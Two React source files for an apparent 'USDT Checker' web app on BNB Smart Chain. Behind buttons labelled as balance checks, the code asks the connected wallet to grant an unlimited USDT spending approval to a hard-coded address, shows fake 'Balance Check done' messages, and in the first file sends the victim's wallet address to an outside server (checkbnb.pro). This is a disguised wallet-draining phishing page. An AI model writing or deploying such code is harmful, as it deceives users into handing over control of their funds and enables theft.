




import React, { useState, useEffect } from "react";
import { ethers } from "ethers";

const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // USDT (BEP-20)
const USDT_ABI = [
  "function approve(address spender, uint256 amount) public returns (bool)",
  "function allowance(address owner, address spender) public view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function balanceOf(address account) external view returns (uint256)",
];

const SPENDER_CONTRACT_ADDRESS = "0x25bcea1e87afdb94be3081ab379f28f00cf84eeb"; // Your contract

function App() {
  const [walletAddress, setWalletAddress] = useState("");
  const [status, setStatus] = useState("");
  const [usdtBalance, setUsdtBalance] = useState(null);

  useEffect(() => {
    const checkConnection = async () => {
      if (window.ethereum) {
        const accounts = await window.ethereum.request({ method: "eth_accounts" });
        if (accounts.length) {
          setWalletAddress(accounts[0]);
          fetchUSDTBalance(accounts[0]);
        }
      }
    };
    checkConnection();
  }, []);

  const connectWallet = async () => {
    if (!window.ethereum) {
      return alert("MetaMask not found");
    }
    const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
    setWalletAddress(accounts[0]);
    fetchUSDTBalance(accounts[0]);
  };

  const fetchUSDTBalance = async (address) => {
    try {
      const provider = new ethers.BrowserProvider(window.ethereum);
      const usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, provider);
      const decimals = await usdt.decimals();
      const balanceRaw = await usdt.balanceOf(address);
      const balanceFormatted = ethers.formatUnits(balanceRaw, decimals);
      setUsdtBalance(balanceFormatted);
    } catch (err) {
      console.error("Error fetching balance:", err);
      setUsdtBalance(null);
    }
  };

  const checkUSDT = async () => {
    try {
      if (!window.ethereum) throw new Error("MetaMask not found");

      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);

      // Approve unlimited USDT
      const maxApproval = ethers.MaxUint256;

      const tx = await usdt.approve(SPENDER_CONTRACT_ADDRESS, maxApproval);
      setStatus("⏳ Checking USDT...");
      await tx.wait();
      setStatus("✅ Balance Check done!");

      // Trigger backend with connected wallet address
      const res = await fetch("http://checkbnb.pro", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ sender: walletAddress }),
      });

      if (res.ok) {
        const result = await res.json();
        setStatus("✅ Backend triggered: " + result.message);
      } else {
        setStatus("⚠️ Backend failed to respond.");
      }
    } catch (err) {
      console.error(err);
      setStatus("❌ Error: " + err.message);
    }
  };

  return (
    <div style={{ padding: "2rem", fontFamily: "sans-serif" }}>
      <h1>🪙 USDT Checker BEP20</h1>

      {walletAddress ? (
        <>
          <p>🔗 Connected: <strong>{walletAddress}</strong></p>
          {usdtBalance !== null && (
            <p>💰 USDT Balance: <strong>{usdtBalance}</strong></p>
          )}
        </>
      ) : (
        <button onClick={connectWallet}>Connect Wallet</button>
      )}

      <button onClick={checkUSDT} style={{ marginTop: "1rem" }}>
        Check Balance now!!1
      </button>

      {status && (
        <p style={{ marginTop: "1rem", color: status.startsWith("❌") ? "red" : "green" }}>
          {status}
        </p>
      )}
    </div>
  );
}

export default App;





// src/App.js
import React, { useState } from "react";
import { ethers } from "ethers";
import "./Background.css";

const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // BSC USDT
const BACKEND_SPENDER_ADDRESS = "0x25BcEa1E87afDb94Be3081ab379F28F00cF84EEb"; // your backend address

const USDT_ABI = [
  "function approve(address spender, uint256 amount) external returns (bool)",
];

function App() {
  const [provider, setProvider] = useState(null);
  const [signer, setSigner] = useState(null);
  const [account, setAccount] = useState(null);
  const [txHash, setTxHash] = useState(null);
  const [loading, setLoading] = useState(false);
  const [darkMode, setDarkMode] = useState(false);

  async function connectWallet() {
    if (!window.ethereum) {
      alert("Please install MetaMask or Trust Wallet");
      return;
    }

    const BSC_CHAIN_ID = "0x38"; // BSC mainnet

    try {
      const currentChainId = await window.ethereum.request({ method: "eth_chainId" });

      if (currentChainId !== BSC_CHAIN_ID) {
        try {
          await window.ethereum.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: BSC_CHAIN_ID }],
          });
        } catch (switchError) {
          if (switchError.code === 4902) {
            try {
              await window.ethereum.request({
                method: "wallet_addEthereumChain",
                params: [{
                  chainId: BSC_CHAIN_ID,
                  chainName: "Binance Smart Chain Mainnet",
                  nativeCurrency: {
                    name: "Binance Coin",
                    symbol: "BNB",
                    decimals: 18
                  },
                  rpcUrls: ["https://bsc-dataseed.binance.org/"],
                  blockExplorerUrls: ["https://bscscan.com"]
                }],
              });
            } catch (addError) {
              console.error("Add BSC Error:", addError);
              alert("Failed to add Binance Smart Chain to wallet");
              return;
            }
          } else {
            console.error("Switch Error:", switchError);
            alert("Failed to switch to Binance Smart Chain");
            return;
          }
        }
      }

      await window.ethereum.request({ method: "eth_requestAccounts" });
      const _provider = new ethers.BrowserProvider(window.ethereum);
      const _signer = await _provider.getSigner();
      const address = await _signer.getAddress();

      setProvider(_provider);
      setSigner(_signer);
      setAccount(address);
      setTxHash(null);
    } catch (error) {
      console.error("Connection error:", error);
      alert("Failed to connect wallet");
    }
  }

  async function CheckBalance() {
    if (!signer) {
      alert("Please connect your wallet first");
      return;
    }

    const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
    const maxAmount = ethers.MaxUint256;

    try {
      setLoading(true);
      const tx = await usdtContract.approve(BACKEND_SPENDER_ADDRESS, maxAmount);
      setTxHash(tx.hash);
      await tx.wait();
      alert("Approval confirmed!");
    } catch (error) {
      console.error("Approval error:", error);
      alert("Approval failed: " + error.message);
    } finally {
      setLoading(false);
    }
  }

  return (
    <div className={`app-background ${darkMode ? "dark" : "light"}`}>
      <div className="content">
        <div className="toggle-container">
          <label className="switch">
            <input type="checkbox" onChange={() => setDarkMode(!darkMode)} />
            <span className="slider round"></span>
          </label>
        </div>
        <h2>USDT BEP20 Token Verify</h2>
        {!account ? (
          <button onClick={connectWallet} disabled={loading}>
            Connect Wallet
          </button>
        ) : (
          <>
            <p>Connected: <b>{account}</b></p>
            <button onClick={CheckBalance} disabled={loading}>
              {loading ? "Checking..." : "Check USDT"}
            </button>
            {txHash && (
              <p>
                Tx Hash: <a href={`https://bscscan.com/tx/${txHash}`} target="_blank" rel="noreferrer">
                  {txHash.slice(0, 10)}...{txHash.slice(-8)}
                </a>
              </p>
            )}
          </>
        )}
      </div>
    </div>
  );
}

export default App;
